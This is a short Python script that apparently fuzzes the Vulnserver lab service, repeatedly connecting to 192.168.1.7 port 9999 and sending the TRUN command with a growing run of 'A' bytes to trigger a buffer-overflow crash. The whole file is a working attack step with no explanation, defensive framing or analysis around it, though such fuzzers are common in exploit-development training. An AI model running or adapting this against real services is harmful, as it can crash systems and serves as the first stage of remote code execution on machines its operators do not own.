#!/usr/bin/python3

import sys,socket
from time import sleep

buffer=100


while buffer <= 10000:
    print(f"Sending bytes: {buffer}")
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(('192.168.1.7', 9999))
    s.send((b'TRUN /.:/ ' + b"A" * buffer))
    s.close()
    buffer=buffer+300
    sleep(1)
